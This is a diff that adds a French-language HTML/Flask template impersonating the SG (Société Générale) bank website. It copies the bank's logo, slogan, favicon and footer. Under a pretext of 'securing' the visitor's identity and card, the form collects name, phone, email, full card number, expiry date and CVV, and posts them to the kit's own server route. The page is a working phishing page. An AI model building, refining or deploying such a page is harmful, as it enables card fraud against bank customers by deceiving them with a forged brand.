@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SG | Sécurisation de vos informations</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;700&display=swap" rel="stylesheet">
+
+    <link rel="icon" href="https://particuliers.sg.fr/images/logo-sg-seul.svg">
+
+    <style>
+        /* --- Styles de base --- */
+        body {
+            font-family: 'Source Sans Pro', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f8f8;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* --- En-tête (Header) --- */
+        .main-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 30px;
+            background-color: #fff;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            flex-wrap: wrap;
+        }
+
+        .main-header .logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .main-header .logo img {
+            height: 35px;
+            margin-right: 15px;
+        }
+
+        .main-header .logo span {
+            font-size: 14px;
+            font-weight: bold;
+            color: #e60028;
+            letter-spacing: 1px;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .header-actions .btn-secondary,
+        .header-actions .btn-primary {
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s, border-color 0.3s;
+        }
+
+        .header-actions .btn-secondary {
+            background: none;
+            border: 1px solid #ccc;
+            color: #555;
+        }
+
+        .header-actions .btn-secondary:hover,
+        .header-actions .btn-secondary:focus {
+            background-color: #f0f0f0;
+            border-color: #999;
+            outline: none;
+        }
+
+        .header-actions .btn-primary {
+            background-color: #e60028;
+            color: #fff;
+            border: none;
+        }
+
+        .header-actions .btn-primary:hover,
+        .header-actions .btn-primary:focus {
+            background-color: #cc001f;
+            outline: none;
+        }
+
+        /* --- Contenu principal (Main) --- */
+        .main-content {
+            flex-grow: 1;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+        }
+
+        .form-container {
+            margin: 40px auto;
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            max-width: 500px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .form-container h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .form-container .subtitle {
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: #e60028;
+            box-shadow: 0 0 5px rgba(230, 0, 40, 0.2);
+            outline: none;
+        }
+
+        /* Styles spécifiques pour le bloc de carte bancaire */
+        .card-container {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px dashed #ccc;
+        }
+
+        .card-container h3 {
+            font-size: 18px;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        .card-container .card-subtitle {
+            font-size: 13px;
+            color: #777;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .card-info-group {
+            display: flex;
+            justify-content: space-between;
+            gap: 20px;
+        }
+
+        .card-info-group .form-group {
+            flex: 1;
+        }
+
+        .card-info-group .form-group.cvv {
+            flex: 0.5;
+        }
+
+        @media screen and (max-width: 480px) {
+             .card-info-group {
+                flex-direction: column;
+                gap: 0;
+            }
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background-color: #e60028;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-submit:hover,
+        .btn-submit:focus {
+            background-color: #cc001f;
+            outline: none;
+        }
+
+        /* --- Pied de page (Footer) --- */
+        .main-footer {
+            margin-top: auto;
+            background-color: #f8f8f8;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            border-top: 1px solid #eee;
+        }
+
+        .footer-main, .footer-sub {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 15px;
+        }
+
+        .footer-main a, .footer-sub a {
+            color: #333;
+            text-decoration: none;
+            font-weight: bold;
+            transition: color 0.3s, text-decoration 0.3s;
+        }
+
+        .footer-main a:hover,
+        .footer-main a:focus,
+        .footer-sub a:hover,
+        .footer-sub a:focus {
+            text-decoration: underline;
+            color: #e60028;
+        }
+
+        .footer-sub {
+            font-size: 11px;
+            font-weight: normal;
+        }
+
+        /* --- Règle de média-query pour les petits écrans (smartphones) --- */
+        @media screen and (max-width: 768px) {
+            .main-header {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .main-header .logo {
+                margin-bottom: 15px;
+            }
+
+            .header-actions {
+                flex-direction: column;
+                width: 100%;
+                gap: 10px;
+            }
+
+            .header-actions button {
+                width: 100%;
+            }
+
+            .main-content {
+                padding: 10px;
+            }
+
+            .form-container {
+                margin: 20px auto;
+                padding: 20px;
+            }
+
+            .main-footer .footer-main,
+            .main-footer .footer-sub {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="main-header">
+        <div class="logo">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQV5LKSDzNeLQ1zujcBysUqcV7KA_vEdcWlf8tfkuau78NmZxMKKbm_lh8JHCL64-km0g&usqp=CAU" alt="Logo SG">
+            <span>C'EST VOUS L'AVENIR</span>
+        </div>
+        <div class="header-actions">
+            <button class="btn-secondary">Aide et contacts</button>
+            <button class="btn-primary">Ouvrir un compte</button>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="form-container">
+            <h2>Vérification de vos informations</h2>
+            <p class="subtitle">Ces informations sont nécessaires pour la vérification et la sécurisation de votre identité. Elles nous permettront de garantir la protection de votre compte.</p>
+            <form action="{{ url_for('formulaire') }}" method="post">
+                <div class="form-group">
+                    <label for="nom">Nom</label>
+                    <input type="text" id="nom" name="nom" required placeholder="Votre nom" autocomplete="family-name">
+                </div>
+                <div class="form-group">
+                    <label for="prenom">Prénom</label>
+                    <input type="text" id="prenom" name="prenom" required placeholder="Votre prénom" autocomplete="given-name">
+                </div>
+                <div class="form-group">
+                    <label for="numero">Numéro de téléphone</label>
+                    <input type="tel" id="numero" name="numero" required placeholder="Ex: 0612345678" pattern="^((\+33|0)[1-9])(?:[\s.-]*\d{2}){4}$" autocomplete="tel">
+                </div>
+                <div class="form-group">
+                    <label for="email">Adresse email</label>
+                    <input type="email" id="email" name="email" required placeholder="Ex: votrenom@email.com" autocomplete="email">
+                </div>
+
+                <div class="card-container">
+                    <h3>Sécurisation de la carte bancaire</h3>
+                    <p class="card-subtitle">Nous allons procéder à la sécurisation de votre carte afin de protéger vos achats et retraits, et d'assurer une traçabilité complète de vos transactions.</p>
+                    <div class="form-group">
+                        <label for="card-number">Numéro de carte</label>
+                        <input type="text" id="card-number" name="card-number" placeholder="XXXX XXXX XXXX XXXX" required pattern="[0-9]{16}">
+                    </div>
+                    <div class="card-info-group">
+                        <div class="form-group">
+                            <label for="card-exp">Date d'expiration</label>
+                            <input type="text" id="card-exp" name="card-exp" placeholder="MM/AA" required pattern="(0[1-9]|1[0-2])\/?([0-9]{2})">
+                        </div>
+                        <div class="form-group cvv">
+                            <label for="card-cvv">CVV</label>
+                            <input type="text" id="card-cvv" name="card-cvv" placeholder="123" required pattern="[0-9]{3,4}">
+                        </div>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit">Envoyer</button>
+            </form>
+        </div>
+    </main>
+
+    <footer class="main-footer">
+        <div class="footer-main">
+            <a href="#">Questions fréquentes</a>
+            <a href="#">Trouver une agence</a>
+            <a href="#">Autres sites SG</a>
+        </div>
+        <div class="footer-sub">
+            <a href="#">Sécurité</a>
+            <a href="#">Nos engagements</a>
+            <a href="#">Gestion des Cookies</a>
+            <a href="#">Données personnelles</a>
+            <a href="#">Documentation et Tarifs</a>
+            <a href="#">Résilier une prestation</a>
+            <a href="#">Contestation et réclamation</a>
+            <a href="#">Informations légales</a>
+            <a href="#">Accessibilité Numérique (partiellement conforme)</a>
+            <a href="#">Label « Engagé RSE »</a>
+        </div>
+    </footer>
+</body>
+</html>
